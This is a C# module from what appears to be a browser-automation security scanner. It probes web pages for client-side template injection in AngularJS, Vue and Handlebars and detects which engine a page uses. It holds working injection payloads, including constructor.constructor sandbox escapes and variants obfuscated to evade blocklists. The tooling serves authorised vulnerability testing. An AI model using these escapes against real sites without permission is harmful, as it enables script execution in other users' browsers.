using Trowser.Automation;

namespace Trowser.Security;

/// <summary>Client-side template injection probe definitions and tech-stack prioritization.</summary>
public static class CstiProbes
{
    public enum Engine
    {
        AngularJs,
        Vue,
        Handlebars,
        Generic
    }

    public enum Source
    {
        UrlQuery,
        UrlHash
    }

    public sealed class EngineDifferentiator
    {
        public string Payload { get; init; } = "";
        public string ExpectedToken { get; init; } = "";
    }

    private static readonly Dictionary<Engine, string[]> BasicByEngine = new()
    {
        [Engine.AngularJs] = ["{{7*7}}"],
        [Engine.Vue] = ["{{7*7}}"],
        [Engine.Handlebars] = ["{{7*7}}"],
        [Engine.Generic] = ["{{7*7}}"]
    };

    private static readonly Dictionary<Engine, EngineDifferentiator> DifferentiatorByEngine = new()
    {
        [Engine.AngularJs] = new() { Payload = "{{7*'7'}}", ExpectedToken = "7777777" },
        [Engine.Handlebars] = new() { Payload = "{{#if true}}TROWSER-HB{{/if}}", ExpectedToken = "TROWSER-HB" }
    };

    private static readonly Dictionary<Engine, string> EscalationByEngine = new()
    {
        [Engine.AngularJs] = "{{constructor.constructor('return globalThis')()}}",
        [Engine.Vue] = "{{_openBlock.constructor('return globalThis')()}}",
        [Engine.Handlebars] = "{{constructor.constructor('return globalThis')()}}",
        [Engine.Generic] = "{{constructor.constructor('return globalThis')()}}"
    };

    public static IReadOnlyList<string> BasicPayloads(Engine engine) =>
        BasicByEngine.TryGetValue(engine, out var payloads) ? payloads : BasicByEngine[Engine.Generic];

    public static EngineDifferentiator? Differentiator(Engine engine) =>
        DifferentiatorByEngine.TryGetValue(engine, out var diff) ? diff : null;

    public static string? EscalationPayload(Engine engine) =>
        EscalationByEngine.TryGetValue(engine, out var payload) ? payload : EscalationByEngine[Engine.Generic];

    /// <summary>Sandbox-escape variants when naive blocklists filter literal substrings like "constructor".</summary>
    public static IEnumerable<string> EscalationVariants(Engine engine)
    {
        var seen = new HashSet<string>(StringComparer.Ordinal);
        string?[] candidates =
        [
            EscalationPayload(engine),
            "{{this.constructor.constructor('return globalThis')()}}",
            "{{this.constructor.constructor('return this')()}}",
            "{{['constructor']['constructor']('return globalThis')()}}",
            "{{this['con'+'structor']['con'+'structor']('return globalThis')()}}",
            "{{(function(){return this})().constructor.constructor('return globalThis')()}}",
            engine == Engine.Vue
                ? "{{_openBlock.constructor.constructor('return globalThis')()}}"
                : "{{this.constructor.constructor(String.fromCharCode(114,101,116,117,114,110,32,103,108,111,98,97,108,84,104,105,115))()}}"
        ];

        foreach (var p in candidates)
        {
            if (string.IsNullOrWhiteSpace(p)) continue;
            if (seen.Add(p))
                yield return p;
        }
    }

    public static string EngineName(Engine engine) => engine switch
    {
        Engine.AngularJs => "angularjs",
        Engine.Vue => "vue",
        Engine.Handlebars => "handlebars",
        _ => "generic"
    };

    public static Engine? ParseEngine(string? name) => name?.Trim().ToLowerInvariant() switch
    {
        "angular" or "angularjs" or "angular-js" => Engine.AngularJs,
        "vue" or "vuejs" or "vue.js" => Engine.Vue,
        "handlebars" or "mustache" => Engine.Handlebars,
        "generic" => Engine.Generic,
        _ => null
    };

    public static Source? ParseSource(string? name) => name?.Trim().ToLowerInvariant() switch
    {
        "url-query" or "query" => Source.UrlQuery,
        "url-hash" or "hash" or "fragment" => Source.UrlHash,
        _ => null
    };

    public static List<Engine> ResolveEngines(IReadOnlyList<string>? requested, TechStackResult? stack)
    {
        if (requested is { Count: > 0 })
        {
            var parsed = requested
                .Select(ParseEngine)
                .Where(e => e.HasValue)
                .Select(e => e!.Value)
                .Distinct()
                .ToList();
            if (parsed.Count > 0) return parsed;
        }

        var engines = DetectEnginesFromStack(stack);
        if (engines.Count == 0)
            engines.Add(Engine.Generic);
        return engines.Distinct().ToList();
    }

    public static async Task<List<Engine>> ResolveEnginesAsync(
        AutomationContext ctx,
        IReadOnlyList<string>? requested,
        TechStackResult? stack)
    {
        var engines = ResolveEngines(requested, stack);
        if (engines.Count == 1 && engines[0] == Engine.Generic)
        {
            var domEngines = await DetectEnginesFromDomAsync(ctx);
            if (domEngines.Count > 0)
                return domEngines;
        }

        return engines;
    }

    public static List<Engine> DetectEnginesFromStack(TechStackResult? stack)
    {
        var engines = new List<Engine>();
        if (stack == null) return engines;

        foreach (var det in stack.Detections)
        {
            if (det.Name.Equals("AngularJS", StringComparison.OrdinalIgnoreCase))
                engines.Add(Engine.AngularJs);
            else if (det.Name.Equals("Vue.js", StringComparison.OrdinalIgnoreCase))
                engines.Add(Engine.Vue);
            else if (det.Name.Equals("Handlebars", StringComparison.OrdinalIgnoreCase))
                engines.Add(Engine.Handlebars);
        }

        return engines.Distinct().ToList();
    }

    public static bool HasCstiRelevantFramework(TechStackResult? stack) =>
        DetectEnginesFromStack(stack).Count > 0;

    public static async Task<List<Engine>> DetectEnginesFromDomAsync(AutomationContext ctx)
    {
        var engines = new List<Engine>();
        try
        {
            var json = await ctx.ExecuteJs("""
                (function() {
                    try {
                        var out = [];
                        if (typeof angular !== 'undefined' && angular.version) out.push('angularjs');
                        if (typeof Vue !== 'undefined') out.push('vue');
                        if (typeof Handlebars !== 'undefined') out.push('handlebars');
                        if (document.querySelector('[ng-app], [data-ng-app], [ng-controller], .ng-scope, [ng-version]'))
                            out.push('angularjs');
                        return JSON.stringify(out);
                    } catch (e) {
                        return '[]';
                    }
                })()
                """);
            var names = System.Text.Json.JsonSerializer.Deserialize<List<string>>(json) ?? [];
            foreach (var name in names)
            {
                var engine = ParseEngine(name);
                if (engine.HasValue) engines.Add(engine.Value);
            }
        }
        catch { /* optional */ }

        return engines.Distinct().ToList();
    }

    public static List<Source> ResolveSources(IReadOnlyList<string>? requested)
    {
        if (requested is { Count: > 0 })
        {
            var parsed = requested
                .Select(ParseSource)
                .Where(s => s.HasValue)
                .Select(s => s!.Value)
                .Distinct()
                .ToList();
            if (parsed.Count > 0) return parsed;
        }

        return [Source.UrlQuery, Source.UrlHash];
    }

    /// <summary>Pick the most likely engine after differentiator probes. Vue is inferred from DOM globals.</summary>
    public static async Task<Engine> IdentifyEngineAsync(
        AutomationContext ctx,
        IReadOnlyList<Engine> candidates,
        Func<Engine, Task<bool>> differentiatorMatches)
    {
        if (candidates.Contains(Engine.AngularJs) && await differentiatorMatches(Engine.AngularJs))
            return Engine.AngularJs;

        if (candidates.Contains(Engine.Handlebars) && await differentiatorMatches(Engine.Handlebars))
            return Engine.Handlebars;

        var domEngines = await DetectEnginesFromDomAsync(ctx);
        if (candidates.Contains(Engine.Vue) && domEngines.Contains(Engine.Vue))
            return Engine.Vue;

        if (candidates.Contains(Engine.AngularJs) && domEngines.Contains(Engine.AngularJs))
            return Engine.AngularJs;

        return Engine.Generic;
    }
}
